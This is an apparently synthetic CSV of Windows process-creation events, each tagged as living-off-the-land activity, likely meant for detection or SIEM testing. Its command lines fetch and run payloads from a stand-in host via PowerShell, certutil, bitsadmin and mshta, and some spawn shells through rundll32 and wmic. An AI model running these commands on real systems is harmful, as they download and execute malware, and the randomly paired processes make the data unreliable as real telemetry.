_time,host,EventCode,user,src_ip,process,command_line,status,description
2025-09-10T12:16:25,WIN-APP01,4688,alice,10.0.0.5,bitsadmin.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:16:30,WIN-DB01,4688,alice,10.0.0.8,bitsadmin.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:16:35,WIN-DB01,4688,alice,10.0.0.8,rundll32.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:16:40,WIN-WS01,4688,alice,10.0.0.8,wmic.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:16:45,WIN-DC01,4688,alice,10.0.0.44,powershell.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:16:50,WIN-WS02,4688,alice,10.0.0.5,mshta.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:16:55,WIN-WS02,4688,alice,10.0.0.5,powershell.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:17:00,WIN-APP01,4688,alice,10.0.0.12,powershell.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:17:05,WIN-APP01,4688,alice,10.0.0.12,certutil.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:17:10,WIN-DB01,4688,alice,10.0.0.5,certutil.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:17:15,WIN-DB01,4688,alice,10.0.0.12,cmd.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:17:20,WIN-WS02,4688,alice,10.0.0.44,certutil.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:17:25,WIN-DB01,4688,alice,10.0.0.8,cmd.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:17:30,WIN-DC01,4688,alice,10.0.0.5,powershell.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:17:35,WIN-WS01,4688,alice,10.0.0.44,bitsadmin.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:17:40,WIN-WS02,4688,alice,10.0.0.5,powershell.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:17:45,WIN-WS02,4688,alice,10.0.0.44,bitsadmin.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:17:50,WIN-WS02,4688,alice,10.0.0.44,mshta.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:17:55,WIN-APP01,4688,alice,10.0.0.12,powershell.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:18:00,WIN-APP01,4688,alice,10.0.0.12,certutil.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:18:05,WIN-DB01,4688,alice,10.0.0.44,powershell.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:18:10,WIN-DC01,4688,alice,10.0.0.12,wmic.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:18:15,WIN-WS01,4688,alice,10.0.0.5,rundll32.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:18:20,WIN-DC01,4688,alice,10.0.0.8,bitsadmin.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:18:25,WIN-WS01,4688,alice,10.0.0.5,mshta.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:18:30,WIN-APP01,4688,alice,10.0.0.8,powershell.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:18:35,WIN-APP01,4688,alice,10.0.0.44,cmd.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:18:40,WIN-DB01,4688,alice,10.0.0.8,bitsadmin.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:18:45,WIN-DC01,4688,alice,10.0.0.44,rundll32.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:18:50,WIN-DC01,4688,alice,10.0.0.5,powershell.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:18:55,WIN-DB01,4688,alice,10.0.0.8,bitsadmin.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:19:00,WIN-WS01,4688,alice,10.0.0.8,mshta.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:19:05,WIN-APP01,4688,alice,10.0.0.12,rundll32.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:19:10,WIN-DB01,4688,alice,10.0.0.44,cmd.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:19:15,WIN-DC01,4688,alice,10.0.0.8,bitsadmin.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:19:20,WIN-WS02,4688,alice,10.0.0.8,bitsadmin.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:19:25,WIN-WS02,4688,alice,10.0.0.5,cmd.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:19:30,WIN-DB01,4688,alice,10.0.0.12,mshta.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:19:35,WIN-WS02,4688,alice,10.0.0.5,wmic.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:19:40,WIN-WS01,4688,alice,10.0.0.5,cmd.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:19:45,WIN-DB01,4688,alice,10.0.0.8,mshta.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:19:50,WIN-APP01,4688,alice,10.0.0.8,bitsadmin.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:19:55,WIN-DC01,4688,alice,10.0.0.8,wmic.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:20:00,WIN-WS01,4688,alice,10.0.0.12,mshta.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:20:05,WIN-APP01,4688,alice,10.0.0.5,rundll32.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:20:10,WIN-DC01,4688,alice,10.0.0.44,certutil.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:20:15,WIN-WS02,4688,alice,10.0.0.12,certutil.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:20:20,WIN-WS02,4688,alice,10.0.0.8,wmic.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:20:25,WIN-DC01,4688,alice,10.0.0.8,wmic.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:20:30,WIN-WS01,4688,alice,10.0.0.12,rundll32.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:20:35,WIN-WS02,4688,alice,10.0.0.12,cmd.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:20:40,WIN-WS01,4688,alice,10.0.0.44,bitsadmin.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:20:45,WIN-WS01,4688,alice,10.0.0.8,rundll32.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:20:50,WIN-WS01,4688,alice,10.0.0.8,wmic.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:20:55,WIN-APP01,4688,alice,10.0.0.12,bitsadmin.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:21:00,WIN-APP01,4688,alice,10.0.0.44,powershell.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:21:05,WIN-WS02,4688,alice,10.0.0.5,certutil.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:21:10,WIN-DB01,4688,alice,10.0.0.12,powershell.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:21:15,WIN-DB01,4688,alice,10.0.0.12,mshta.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:21:20,WIN-APP01,4688,alice,10.0.0.5,cmd.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:21:25,WIN-DB01,4688,alice,10.0.0.8,mshta.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:21:30,WIN-DB01,4688,alice,10.0.0.12,certutil.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:21:35,WIN-DB01,4688,alice,10.0.0.5,wmic.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:21:40,WIN-DC01,4688,alice,10.0.0.8,wmic.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:21:45,WIN-DC01,4688,alice,10.0.0.8,bitsadmin.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:21:50,WIN-WS01,4688,alice,10.0.0.8,mshta.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:21:55,WIN-DB01,4688,alice,10.0.0.5,mshta.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:22:00,WIN-DB01,4688,alice,10.0.0.44,rundll32.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:22:05,WIN-DB01,4688,alice,10.0.0.44,cmd.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:22:10,WIN-WS01,4688,alice,10.0.0.12,bitsadmin.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:22:15,WIN-DC01,4688,alice,10.0.0.5,rundll32.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:22:20,WIN-WS02,4688,alice,10.0.0.8,mshta.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:22:25,WIN-WS02,4688,alice,10.0.0.5,wmic.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:22:30,WIN-WS01,4688,alice,10.0.0.12,rundll32.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:22:35,WIN-DC01,4688,alice,10.0.0.8,bitsadmin.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:22:40,WIN-WS02,4688,alice,10.0.0.8,certutil.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:22:45,WIN-APP01,4688,alice,10.0.0.5,cmd.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:22:50,WIN-DC01,4688,alice,10.0.0.44,powershell.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:22:55,WIN-DB01,4688,alice,10.0.0.12,wmic.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:23:00,WIN-APP01,4688,alice,10.0.0.8,powershell.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:23:05,WIN-WS02,4688,alice,10.0.0.12,wmic.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:23:10,WIN-WS02,4688,alice,10.0.0.12,bitsadmin.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:23:15,WIN-WS01,4688,alice,10.0.0.5,rundll32.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:23:20,WIN-DB01,4688,alice,10.0.0.5,bitsadmin.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:23:25,WIN-WS02,4688,alice,10.0.0.5,wmic.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:23:30,WIN-APP01,4688,alice,10.0.0.8,mshta.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:23:35,WIN-APP01,4688,alice,10.0.0.44,cmd.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:23:40,WIN-APP01,4688,alice,10.0.0.8,wmic.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:23:45,WIN-DC01,4688,alice,10.0.0.12,powershell.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:23:50,WIN-APP01,4688,alice,10.0.0.5,certutil.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:23:55,WIN-WS01,4688,alice,10.0.0.8,bitsadmin.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:24:00,WIN-WS02,4688,alice,10.0.0.5,rundll32.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:24:05,WIN-DC01,4688,alice,10.0.0.5,rundll32.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:24:10,WIN-WS02,4688,alice,10.0.0.5,mshta.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:24:15,WIN-WS01,4688,alice,10.0.0.12,cmd.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:24:20,WIN-APP01,4688,alice,10.0.0.8,bitsadmin.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:24:25,WIN-DC01,4688,alice,10.0.0.44,powershell.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:24:30,WIN-DC01,4688,alice,10.0.0.8,cmd.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:24:35,WIN-DC01,4688,alice,10.0.0.12,cmd.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:24:40,WIN-WS02,4688,alice,10.0.0.44,powershell.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:24:45,WIN-WS02,4688,alice,10.0.0.12,certutil.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:24:50,WIN-WS01,4688,alice,10.0.0.5,certutil.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:24:55,WIN-WS02,4688,alice,10.0.0.5,powershell.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:25:00,WIN-APP01,4688,alice,10.0.0.8,certutil.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:25:05,WIN-DB01,4688,alice,10.0.0.8,mshta.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:25:10,WIN-WS02,4688,alice,10.0.0.5,cmd.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:25:15,WIN-APP01,4688,alice,10.0.0.44,cmd.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:25:20,WIN-DB01,4688,alice,10.0.0.44,powershell.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:25:25,WIN-WS02,4688,alice,10.0.0.44,wmic.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:25:30,WIN-WS02,4688,alice,10.0.0.12,mshta.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:25:35,WIN-WS02,4688,alice,10.0.0.12,powershell.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:25:40,WIN-WS02,4688,alice,10.0.0.8,bitsadmin.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:25:45,WIN-WS02,4688,alice,10.0.0.44,mshta.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:25:50,WIN-DB01,4688,alice,10.0.0.12,cmd.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:25:55,WIN-DC01,4688,alice,10.0.0.5,bitsadmin.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:26:00,WIN-WS01,4688,alice,10.0.0.8,mshta.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:26:05,WIN-APP01,4688,alice,10.0.0.44,mshta.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:26:10,WIN-DB01,4688,alice,10.0.0.5,certutil.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:26:15,WIN-WS02,4688,alice,10.0.0.44,bitsadmin.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:26:20,WIN-WS01,4688,alice,10.0.0.44,wmic.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:26:25,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:26:30,WIN-DB01,4688,alice,10.0.0.44,wmic.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:26:35,WIN-APP01,4688,alice,10.0.0.5,mshta.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:26:40,WIN-APP01,4688,alice,10.0.0.12,wmic.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:26:45,WIN-WS02,4688,alice,10.0.0.12,cmd.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:26:50,WIN-WS02,4688,alice,10.0.0.8,wmic.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:26:55,WIN-WS02,4688,alice,10.0.0.12,certutil.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:27:00,WIN-APP01,4688,alice,10.0.0.5,rundll32.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:27:05,WIN-WS02,4688,alice,10.0.0.12,certutil.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:27:10,WIN-WS01,4688,alice,10.0.0.8,certutil.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:27:15,WIN-WS02,4688,alice,10.0.0.5,powershell.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:27:20,WIN-APP01,4688,alice,10.0.0.5,cmd.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:27:25,WIN-WS01,4688,alice,10.0.0.44,mshta.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:27:30,WIN-DC01,4688,alice,10.0.0.44,wmic.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:27:35,WIN-APP01,4688,alice,10.0.0.5,certutil.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:27:40,WIN-DB01,4688,alice,10.0.0.12,rundll32.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:27:45,WIN-APP01,4688,alice,10.0.0.8,mshta.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:27:50,WIN-DC01,4688,alice,10.0.0.12,powershell.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:27:55,WIN-WS02,4688,alice,10.0.0.12,wmic.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:28:00,WIN-DC01,4688,alice,10.0.0.44,mshta.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:28:05,WIN-DC01,4688,alice,10.0.0.5,wmic.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:28:10,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:28:15,WIN-DC01,4688,alice,10.0.0.44,rundll32.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:28:20,WIN-WS02,4688,alice,10.0.0.8,mshta.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:28:25,WIN-DB01,4688,alice,10.0.0.44,rundll32.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:28:30,WIN-DB01,4688,alice,10.0.0.5,certutil.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:28:35,WIN-WS02,4688,alice,10.0.0.5,bitsadmin.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
